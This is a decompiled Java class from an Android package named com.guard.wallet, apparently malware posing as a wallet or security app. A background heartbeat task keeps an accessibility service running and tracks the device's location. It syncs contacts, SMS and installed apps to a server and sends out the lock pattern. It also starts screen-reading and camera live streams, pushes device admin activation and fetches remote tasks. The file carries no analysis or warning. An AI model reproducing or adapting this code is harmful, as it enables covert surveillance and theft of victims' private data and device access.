package com.guard.wallet.thread;

import a1.AbstractC0026q;
import android.accounts.AccountManager;
import android.content.Context;
import android.os.PowerManager;
import android.support.v4.content.ContextCompat;
import android.util.Log;
import com.google.json.JsonObject;
import com.google.json.reflect.TypeToken;
import com.guard.wallet.MainApplication;
import com.guard.wallet.bridge.C0177a;
import com.guard.wallet.http.AbstractC0207l;
import com.guard.wallet.http.C0204i;
import com.guard.wallet.http.C0205j;
import com.guard.wallet.msg.BridgeBody;
import com.guard.wallet.msg.BridgeMessage;
import com.guard.wallet.req.HeartBodyVO;
import com.guard.wallet.req.LockPatternVO;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.req.ReqCacheTaskBodyVO;
import com.guard.wallet.req.ReqMonitorLocationVO;
import com.guard.wallet.resp.ApiResult;
import com.guard.wallet.resp.DeviceDebugVO;
import com.guard.wallet.server.C0230b;
import com.guard.wallet.service.CustomNotificationService;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.AbstractC0249e;
import com.guard.wallet.utils.AbstractC0250f;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0252h;
import java.util.Objects;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;
import p005h.C0318e;
import p007j.C0350e;
import p015s.C0896a;
import p018v.C0928b;
import p018v.C0929c;

/* renamed from: com.guard.wallet.thread.f */
/* loaded from: classes.dex */
public final class C0237f extends TimerTask {

    /* renamed from: i */
    public static final ReentrantLock f365i = new ReentrantLock();

    /* renamed from: a */
    public final C0896a f366a = new C0896a(5000, 1);

    /* renamed from: b */
    public final C0896a f367b = new C0896a(30000, 10);

    /* renamed from: c */
    public final C0896a f368c = new C0896a(30000, 10);

    /* renamed from: d */
    public final Timer f369d = new Timer();

    /* renamed from: e */
    public Integer f370e = 0;

    /* renamed from: f */
    public final AtomicInteger f371f = new AtomicInteger(0);

    /* renamed from: g */
    public final AtomicInteger f372g = new AtomicInteger(6);

    /* renamed from: h */
    public final AtomicBoolean f373h = new AtomicBoolean(false);

    /* renamed from: b */
    public static void m580b() {
        C0929c c0929c;
        C0928b c0928b;
        if (!AbstractC0250f.f411b.get()) {
            AbstractC0207l.m418a();
        }
        if (MyAccessibilityService.m554P() != null && !MyAccessibilityService.m554P().m565V()) {
            if (MyAccessibilityService.m554P().f328k.get() >= 1) {
                AbstractC0207l.m421d();
            } else {
                MyAccessibilityService.m554P().d0();
            }
        }
        if (CustomNotificationService.f315c == null) {
            String str = AbstractC0207l.f252a;
            if (!AbstractC0026q.m154E(7912)) {
                new C0204i("http://127.0.0.1:7912").m405d(null, "/activeMainNotification", new C0350e(1));
            }
        }
        if (C0929c.f2113f != null) {
            if (((ReqMonitorLocationVO) C0929c.f2113f.f2118e.get()) != null && C0929c.f2113f.f2117d == null) {
                C0929c c0929c2 = C0929c.f2113f;
                c0929c2.getClass();
                if (AbstractC0251g.m653Z() != null && ContextCompat.checkSelfPermission(AbstractC0251g.m653Z(), "android.permission.ACCESS_FINE_LOCATION") == 0 && ContextCompat.checkSelfPermission(AbstractC0251g.m653Z(), "android.permission.ACCESS_COARSE_LOCATION") == 0) {
                    c0929c2.m1393a();
                    if (c0929c2.f2115b != null && c0929c2.f2114a != null) {
                        AtomicReference atomicReference = c0929c2.f2118e;
                        if (atomicReference.get() != null) {
                            long longValue = ((ReqMonitorLocationVO) atomicReference.get()).getMinTimeMs().longValue();
                            float floatValue = ((ReqMonitorLocationVO) atomicReference.get()).getMinDistanceM().floatValue();
                            if (longValue <= 0) {
                                longValue = 10000;
                            }
                            long j2 = longValue;
                            if (floatValue <= 0.0f) {
                                floatValue = 100.0f;
                            }
                            C0928b c0928b2 = new C0928b(c0929c2);
                            c0929c2.f2117d = c0928b2;
                            c0929c2.f2114a.requestLocationUpdates(c0929c2.f2115b, j2, floatValue, c0928b2);
                            Log.d("v.c", "已添加地理位置实时监听");
                        }
                    }
                }
            }
            if (((ReqMonitorLocationVO) C0929c.f2113f.f2118e.get()) == null && C0929c.f2113f.f2117d != null && (c0928b = (c0929c = C0929c.f2113f).f2117d) != null) {
                c0929c.f2114a.removeUpdates(c0928b);
                c0929c.f2117d = null;
                c0929c.f2118e.set(null);
                Log.d("v.c", "已取消地理位置实时监听");
            }
        }
        if (MainApplication.getInstance().getSmsMessageListener() == null || Objects.equals(Integer.valueOf(MainApplication.getInstance().getSmsMessageListener().f2087b), 2)) {
            return;
        }
        if (Objects.equals(Integer.valueOf(MainApplication.getInstance().getSmsMessageListener().f2087b), 0)) {
            MainApplication.getInstance().getSmsMessageListener().m1386a();
        } else {
            AbstractC0207l.m442y();
        }
    }

    /* renamed from: d */
    public static void m581d() {
        boolean m701e;
        boolean m701e2;
        boolean m701e3;
        if (AbstractC0026q.m151B(AbstractC0252h.m708l("deviceId"))) {
            return;
        }
        if (AbstractC0251g.m665l()) {
            synchronized (AbstractC0252h.class) {
                m701e3 = AbstractC0252h.m701e("syncPackages");
            }
            if (!m701e3) {
                AbstractC0243l.m594d(new CallableC0244m(2), "SYNC_DEVICE_INSTALLED_PACKAGES");
            }
        }
        if (AbstractC0251g.m667n()) {
            synchronized (AbstractC0252h.class) {
                m701e2 = AbstractC0252h.m701e("syncContacts");
            }
            if (!m701e2) {
                AbstractC0243l.m594d(new CallableC0244m(1), "SYNC_DEVICE_CONTACTS");
            }
        }
        if (AbstractC0251g.m669p()) {
            synchronized (AbstractC0252h.class) {
                m701e = AbstractC0252h.m701e("syncSmsMessage");
            }
            if (m701e) {
                return;
            }
            AbstractC0243l.m594d(new CallableC0244m(5), "SYNC_DEVICE_SMS");
        }
    }

    /* renamed from: a */
    public final void m582a() {
        JsonObject m419b = AbstractC0207l.m419b(null, "http://127.0.0.1:7910", "/version");
        if (m419b != null) {
            ApiResult apiResult = (ApiResult) AbstractC0252h.m699c(m419b.toString(), new TypeToken<ApiResult<String>>() { // from class: com.guard.wallet.thread.KeepHeartThread$1
            });
            if (apiResult != null && apiResult.getSuccess().booleanValue()) {
                Log.d("KeepHeartThread", "本地HttpServer运行正常");
                this.f371f.set(0);
                return;
            }
        }
        Log.e("KeepHeartThread", "本地HttpServer运行异常");
        if (this.f371f.incrementAndGet() > 5) {
            if (C0230b.f291b != null) {
                C0230b.f291b.f3();
                AbstractC0251g.T0(5);
            }
            if (C0230b.f291b == null) {
                synchronized (C0230b.class) {
                    if (C0230b.f291b == null) {
                        C0230b.f291b = new C0230b();
                    }
                }
            }
            C0230b.f291b.W2();
            this.f371f.set(0);
            Log.d("KeepHeartThread", "本地HttpServer重启完成");
        }
    }

    /* renamed from: c */
    public final void m583c() {
        HeartBodyVO heartBodyVO = new HeartBodyVO();
        heartBodyVO.setPackageName(MainApplication.getInstance().getPackageName());
        heartBodyVO.setContainerCode("ACCESSIBILITY_CONTAINER");
        heartBodyVO.setIsOpened(Integer.valueOf(MyAccessibilityService.m554P() != null ? 1 : 0));
        heartBodyVO.setServiceState(Integer.valueOf(C0230b.f292c.get()));
        MessageRecordVO messageRecordVO = new MessageRecordVO();
        messageRecordVO.setExtraBody(heartBodyVO);
        messageRecordVO.setIntentCode("android.intent.action.DEVICE_RUNNING");
        this.f367b.m1330a(messageRecordVO);
    }

    /* renamed from: e */
    public final void m584e() {
        C0177a c0177a = AbstractC0026q.f57c;
        if (!(c0177a != null && c0177a.f194w.get())) {
            String m708l = AbstractC0252h.m708l("deviceId");
            if (!AbstractC0026q.m151B(m708l)) {
                BridgeBody bridgeBody = new BridgeBody();
                bridgeBody.setDeviceId(m708l);
                bridgeBody.setBridgePath("/cacheTask");
                AbstractC0026q.m178k("/cacheTask", new BridgeMessage(bridgeBody));
            }
        }
        AtomicInteger atomicInteger = this.f372g;
        if (atomicInteger.get() >= 6 || this.f373h.get()) {
            String str = AbstractC0207l.f252a;
            String m708l2 = AbstractC0252h.m708l("deviceId");
            if (AbstractC0026q.m151B(m708l2)) {
                return;
            }
            new C0204i().m405d(new ReqCacheTaskBodyVO(m708l2, "ACCESSIBILITY_CONTAINER"), "/api/containerApi/getCacheTask", new C0205j());
            return;
        }
        AbstractC0026q.m176g("/minicap");
        AbstractC0026q.m176g("/readScreen");
        AbstractC0026q.m176g("/frontCameraLive");
        AbstractC0026q.m176g("/backCameraLive");
        if (atomicInteger.get() < 6) {
            atomicInteger.set(atomicInteger.get() + 1);
        }
    }

    @Override // java.util.TimerTask, java.lang.Runnable
    public final void run() {
        boolean z2 = true;
        this.f370e = 1;
        ReentrantLock reentrantLock = f365i;
        if (reentrantLock.tryLock()) {
            Log.d("KeepHeartThread", "keep heart thread is running");
            try {
                m580b();
                m582a();
                try {
                    if (C0318e.m844S() == null) {
                        C0318e.m845T();
                    } else {
                        C0318e.m844S().m849H();
                    }
                } catch (Exception e2) {
                    AbstractC0026q.m186s("KeepHeartThread", e2);
                }
                boolean z3 = false;
                try {
                    if (AbstractC0252h.m701e("isAdminActivating")) {
                        AbstractC0251g.K0(null);
                    } else {
                        if (AbstractC0251g.m653Z() == null || AccountManager.get(AbstractC0251g.m653Z()).getAccountsByType("com.guard.wallet").length <= 0) {
                            z2 = false;
                        }
                        if (!z2) {
                            AbstractC0251g.m657d();
                        }
                    }
                } catch (Exception e3) {
                    AbstractC0026q.m186s("KeepHeartThread", e3);
                }
                DeviceDebugVO of = DeviceDebugVO.of();
                MessageRecordVO messageRecordVO = new MessageRecordVO();
                messageRecordVO.setExtraBody(of);
                messageRecordVO.setIntentCode("android.intent.action.DEVICE_DEBUG");
                this.f366a.m1330a(messageRecordVO);
                m583c();
                LockPatternVO B0 = AbstractC0251g.B0();
                MessageRecordVO messageRecordVO2 = new MessageRecordVO();
                messageRecordVO2.setIntentCode("android.intent.action.LOCK_PATTERN");
                messageRecordVO2.setExtraBody(B0);
                this.f368c.m1330a(messageRecordVO2);
                String str = AbstractC0249e.f408a;
                Context m653Z = AbstractC0251g.m653Z();
                if (m653Z != null) {
                    try {
                        PowerManager powerManager = (PowerManager) m653Z.getSystemService("power");
                        if (powerManager != null) {
                            z3 = powerManager.isDeviceIdleMode();
                        }
                    } catch (Exception e4) {
                        AbstractC0026q.m186s("DeviceUtils", e4);
                    }
                }
                if (z3) {
                    Log.d("KeepHeartThread", "isIdleMode");
                }
                m581d();
                m584e();
            } catch (Exception e5) {
                AbstractC0026q.m186s("KeepHeartThread", e5);
            }
            reentrantLock.unlock();
        }
    }
}
